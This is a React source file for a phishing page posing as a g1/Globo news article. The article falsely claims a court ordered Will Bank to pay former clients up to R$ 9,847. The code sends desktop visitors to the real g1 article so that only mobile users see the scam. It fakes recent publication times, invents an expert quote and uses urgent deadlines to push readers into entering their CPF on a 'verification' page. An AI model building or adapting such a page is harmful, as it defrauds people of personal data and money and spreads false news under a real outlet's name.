import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Facebook, MessageCircle, Twitter, Share2, Search, User } from "lucide-react";

const Noticia = () => {
  const navigate = useNavigate();

  // Redirecionar desktop imediatamente
  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(userAgent);
    const isSmallScreen = window.innerWidth <= 1024;
    
    // Se for desktop (não é mobile E tela grande)
    if (!isMobileDevice && !isSmallScreen) {
      window.location.href = "https://g1.globo.com/economia/noticia/2026/01/21/liquidacao-do-will-bank-o-que-acontece-com-quem-tem-conta-e-cdb.ghtml";
    }
  }, []);
  // Data dinâmica para parecer notícia recente
  const now = new Date();
  const formattedDate = now.toLocaleDateString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  });
  const formattedTime = now.toLocaleTimeString("pt-BR", {
    hour: "2-digit",
    minute: "2-digit",
  });

  // Data de "publicação" (algumas horas atrás)
  const publishDate = new Date(now.getTime() - 3 * 60 * 60 * 1000);
  const publishDateFormatted = publishDate.toLocaleDateString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  });
  const publishTime = publishDate.toLocaleTimeString("pt-BR", {
    hour: "2-digit",
    minute: "2-digit",
  });

  const handleConsultar = () => {
    navigate("/verificacao");
  };

  return (
    <div className="min-h-screen bg-[#f7f7f7]">
      {/* Top Bar - Globo */}
      <div className="bg-[#1a1a1a] text-white text-xs py-2">
        <div className="max-w-4xl mx-auto px-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <span className="font-bold">globo.com</span>
            <span className="hidden sm:inline text-gray-400">|</span>
            <div className="hidden sm:flex items-center gap-3 text-gray-300">
              <span>g1</span>
              <span>ge</span>
              <span>gshow</span>
              <span>receitas</span>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <Search className="w-4 h-4" />
            <button className="flex items-center gap-1 bg-[#0669de] px-3 py-1 rounded text-xs font-medium">
              <User className="w-3 h-3" />
              Entrar
            </button>
          </div>
        </div>
      </div>

      {/* G1 Header */}
      <header className="bg-[#cc0000] py-3">
        <div className="max-w-4xl mx-auto px-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <span className="text-white text-3xl font-black">g1</span>
            <span className="hidden sm:inline text-white/80 text-sm">ECONOMIA</span>
          </div>
          <div className="text-white/90 text-xs">
            {formattedDate} {formattedTime}
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-6">
        {/* Category Badge */}
        <div className="mb-4">
          <span className="bg-[#cc0000] text-white text-xs font-bold px-2 py-1 rounded">
            URGENTE - BANCO FECHADO
          </span>
        </div>

        {/* Article */}
        <article className="bg-white rounded-lg shadow-sm overflow-hidden">
          <div className="p-4 sm:p-6">
            {/* Title */}
            <h1 className="text-2xl sm:text-3xl font-bold text-[#1a1a1a] leading-tight mb-3">
              Will Bank FECHA as portas e Justiça OBRIGA pagamento de até R$ 9.847 a ex-clientes; veja se você está na lista
            </h1>

            {/* Subtitle */}
            <p className="text-lg text-[#666] mb-4">
              Banco digital encerrou operações e agora TEM QUE devolver valores retidos ilegalmente. Mais de 2 milhões de brasileiros podem ter dinheiro a receber. Sistema de consulta liberado por tempo LIMITADO.
            </p>

            {/* Meta Info */}
            <div className="flex flex-wrap items-center gap-3 text-xs text-[#999] mb-4 pb-4 border-b border-gray-200">
              <span>Por <strong className="text-[#0669de]">Redação G1</strong></span>
              <span>—</span>
              <span>Brasília</span>
              <span className="hidden sm:inline">|</span>
              <span>{publishDateFormatted} às {publishTime}</span>
              <span className="text-[#666]">• Atualizado há 47 minutos</span>
            </div>

            {/* Share Buttons */}
            <div className="flex items-center gap-2 mb-6">
              <button className="flex items-center gap-1 bg-[#3b5998] text-white text-xs px-3 py-1.5 rounded">
                <Facebook className="w-3 h-3" />
                <span className="hidden sm:inline">Compartilhar</span>
              </button>
              <button className="flex items-center gap-1 bg-[#25d366] text-white text-xs px-3 py-1.5 rounded">
                <MessageCircle className="w-3 h-3" />
                <span className="hidden sm:inline">WhatsApp</span>
              </button>
              <button className="flex items-center gap-1 bg-[#1da1f2] text-white text-xs px-3 py-1.5 rounded">
                <Twitter className="w-3 h-3" />
              </button>
              <button className="flex items-center gap-1 bg-gray-200 text-gray-600 text-xs px-3 py-1.5 rounded">
                <Share2 className="w-3 h-3" />
              </button>
            </div>

            {/* Featured Image */}
            <img 
              src="/images/will-bank-hero.png" 
              alt="Cliente usando app Will Bank" 
              className="w-full aspect-video object-cover rounded-lg mb-4"
            />
            <p className="text-xs text-[#999] mb-6">
              BREAKING: Will Bank encerra atividades e Justiça determina devolução de valores a todos os ex-clientes — Foto: Reprodução
            </p>

            {/* Article Body */}
            <div className="prose prose-lg max-w-none text-[#333] space-y-4">
              <p>
                <strong>ACABOU.</strong> O <strong>Will Bank</strong> oficialmente <strong>FECHOU</strong> as portas e a Justiça brasileira não perdoou: <strong>TODOS</strong> os ex-clientes que tiveram conta no banco digital <strong>TEM DIREITO</strong> a receber valores que ficaram retidos. A decisão é <strong>IMEDIATA</strong> e os pagamentos já estão sendo liberados, podendo chegar a <strong>R$ 9.847 por saque</strong>.
              </p>

              <p>
                Com o fechamento do banco, a Justiça determinou que <strong>TODO</strong> o dinheiro que estava "preso" no sistema seja <strong>DEVOLVIDO</strong> aos clientes. São taxas cobradas indevidamente, saldos não resgatados e compensações por práticas abusivas. Se você teve conta no Will Bank, esse dinheiro <strong>É SEU</strong> e está esperando ser resgatado.
              </p>

              {/* CTA Box 1 */}
              <div className="bg-[#f5f5f5] border-l-4 border-[#cc0000] p-4 my-6">
                <p className="text-[#1a1a1a] font-bold mb-2">
                  O Will Bank fechou. Seu dinheiro ficou lá dentro.
                </p>
                <p className="text-[#666] text-sm mb-3">
                  Consulte agora se você tem valores a receber antes que o prazo expire.
                </p>
                <a 
                  onClick={handleConsultar}
                  className="text-[#0669de] font-bold text-sm cursor-pointer hover:underline"
                >
                  → Clique aqui para verificar seu CPF
                </a>
              </div>

              <h2 className="text-xl font-bold text-[#1a1a1a] mt-6">O banco FECHOU. Você tem dinheiro preso lá?</h2>

              <p>
                Quando o Will Bank encerrou as atividades, <strong>MILHARES</strong> de reais ficaram retidos nas contas dos clientes. A Justiça agora <strong>OBRIGA</strong> a devolução para:
              </p>

              <ul className="list-disc pl-6 space-y-2">
                <li>Quem teve conta no Will Bank <strong>(mesmo que fechou há anos)</strong></li>
                <li>Quem fez PIX, transferência ou qualquer movimentação</li>
                <li>Quem apenas <strong>BAIXOU o app</strong> e cadastrou o CPF</li>
                <li>Quem usou cartão de crédito ou débito do banco</li>
              </ul>

              <p>
                <strong>Não importa se você ESQUECEU que tinha conta.</strong> O sistema encontra pelo CPF automaticamente.
              </p>

              <h2 className="text-xl font-bold text-[#1a1a1a] mt-6">Quanto você tem a receber?</h2>

              <p>
                Como o banco <strong>FECHOU</strong>, os valores retidos estão sendo devolvidos <strong>INTEGRALMENTE</strong> mais correção:
              </p>

              <div className="bg-[#f9f9f9] border border-gray-200 p-4 rounded my-4">
                <p className="font-bold text-[#1a1a1a] mb-3">Valores estimados por tempo de conta:</p>
                <ul className="list-disc pl-6 space-y-1 text-[#333]">
                  <li><strong>Até 6 meses:</strong> R$ 2.847 a R$ 3.920</li>
                  <li><strong>6 meses a 1 ano:</strong> R$ 4.150 a R$ 6.340</li>
                  <li><strong>Mais de 1 ano:</strong> R$ 6.890 a R$ 9.847</li>
                </ul>
              </div>

              <div className="bg-[#fffef5] border border-[#e6e4c9] p-4 rounded my-4">
                <p className="font-bold text-[#1a1a1a] mb-2">IMPORTANTE:</p>
                <p className="text-[#333]">
                  Esses são os valores <strong>MÁXIMOS por saque</strong>. Se o seu total for maior, você receberá em <strong>MÚLTIPLAS parcelas</strong>. Por exemplo: quem tem R$ 25.000 a receber, fará 3 saques de aproximadamente R$ 8.300 cada.
                </p>
                <p className="text-[#333] mt-2">
                  O sistema calcula automaticamente quantos saques você tem direito. Na consulta, você verá o valor do <strong>PRIMEIRO saque</strong> disponível.
                </p>
              </div>

              <p className="text-[#cc0000] font-semibold">
                AVISO: Os valores PRESCREVEM. Quem não consultar no prazo PERDE o direito.
              </p>

              <blockquote className="border-l-4 border-[#cc0000] pl-4 italic text-[#666] my-6">
                "Quando um banco fecha, todo o dinheiro dos clientes TEM que ser devolvido. O Will Bank tentou escapar disso, mas a Justiça foi clara: DEVOLVAM TUDO. Clientes com valores altos receberão em parcelas para facilitar o processamento. Se você não consultar, esse dinheiro vai para o governo."
                <br />
                <strong className="not-italic">— Dr. Ricardo Mendes, advogado especialista em liquidação bancária</strong>
              </blockquote>

              <h2 className="text-xl font-bold text-[#1a1a1a] mt-6">Como resgatar seu dinheiro?</h2>

              <p>
                O processo é <strong>SIMPLES</strong> e leva menos de 2 minutos:
              </p>

              <ol className="list-decimal pl-6 space-y-2">
                <li>Clique no botão abaixo para acessar o sistema</li>
                <li>Digite seu CPF para buscar valores vinculados</li>
                <li>Veja na hora quanto você tem a receber no <strong>PRIMEIRO SAQUE</strong></li>
                <li>Siga as instruções para transferir para sua conta</li>
              </ol>

              <p>
                O sistema mostra o valor do primeiro saque disponível. Se você tiver mais a receber, os próximos saques serão liberados automaticamente após o resgate do primeiro.
              </p>

              {/* CTA Box 2 */}
              <div className="bg-[#eee] p-6 rounded my-8 text-center">
                <p className="text-lg font-bold text-[#1a1a1a] mb-2">
                  Consulta disponível por tempo limitado
                </p>
                <p className="text-[#666] text-sm mb-4">
                  Verifique se você tem valores a receber do Will Bank
                </p>
                <button 
                  onClick={handleConsultar}
                  className="bg-[#cc0000] hover:bg-[#aa0000] text-white font-bold py-3 px-8 rounded transition-colors"
                >
                  CONSULTAR MEU CPF
                </button>
                <p className="text-xs text-[#999] mt-3">
                  Consulta gratuita • Resultado imediato
                </p>
              </div>

              <div className="bg-[#fff5f5] border border-[#f0d0d0] p-4 rounded my-4">
                <p className="font-bold text-[#cc0000] mb-2">ÚLTIMO AVISO:</p>
                <p className="text-[#333]">
                  O prazo para resgate está <strong>ACABANDO</strong>. Após o encerramento do processo de liquidação, todo dinheiro não reclamado será transferido <strong>DEFINITIVAMENTE</strong> para a União. Você terá <strong>ZERO</strong> direito de reclamar depois. A Justiça já avisou: quem não consultar <strong>PERDE TUDO</strong>.
                </p>
              </div>

              <p>
                <strong>Seu dinheiro vai virar dinheiro do governo em poucos dias.</strong> Consulte AGORA — leva 30 segundos.
              </p>

              <p className="text-[#666] text-sm italic">
                Nota da redação: Devido ao alto volume de acessos, o sistema pode apresentar lentidão. Se isso acontecer, aguarde e tente novamente. Não desista — seu dinheiro está lá.
              </p>
            </div>

            {/* Tags */}
            <div className="flex flex-wrap gap-2 mt-8 pt-4 border-t border-gray-200">
              <span className="bg-gray-100 text-gray-600 text-xs px-3 py-1 rounded-full">Will Bank</span>
              <span className="bg-gray-100 text-gray-600 text-xs px-3 py-1 rounded-full">Banco Fechado</span>
              <span className="bg-gray-100 text-gray-600 text-xs px-3 py-1 rounded-full">Liquidação</span>
              <span className="bg-gray-100 text-gray-600 text-xs px-3 py-1 rounded-full">Indenização</span>
              <span className="bg-gray-100 text-gray-600 text-xs px-3 py-1 rounded-full">Resgate</span>
            </div>
          </div>
        </article>

        {/* Related News (fake) */}
        <div className="mt-6 bg-white rounded-lg shadow-sm p-4">
          <h3 className="font-bold text-[#1a1a1a] mb-4">Veja também</h3>
          <div className="space-y-3">
            <div className="flex gap-3 pb-3 border-b border-gray-100">
              <img 
                src="/images/banco-central.png" 
                alt="Banco Central do Brasil" 
                className="w-20 h-14 object-cover rounded flex-shrink-0"
              />
              <div>
                <p className="text-sm font-medium text-[#333] line-clamp-2">
                  Banco Central anuncia novas regras para bancos digitais
                </p>
                <span className="text-xs text-[#999]">há 2 horas</span>
              </div>
            </div>
            <div className="flex gap-3 pb-3 border-b border-gray-100">
              <img 
                src="/images/justica.png" 
                alt="Martelo de juiz" 
                className="w-20 h-14 object-cover rounded flex-shrink-0"
              />
              <div>
                <p className="text-sm font-medium text-[#333] line-clamp-2">
                  Justiça determina ressarcimento a clientes de instituições financeiras
                </p>
                <span className="text-xs text-[#999]">há 4 horas</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#1a1a1a] text-white py-6 mt-8">
        <div className="max-w-4xl mx-auto px-4 text-center text-xs text-gray-400">
          <p>© Copyright 2000-2024 Globo Comunicação e Participações S.A.</p>
        </div>
      </footer>
    </div>
  );
};

export default Noticia;
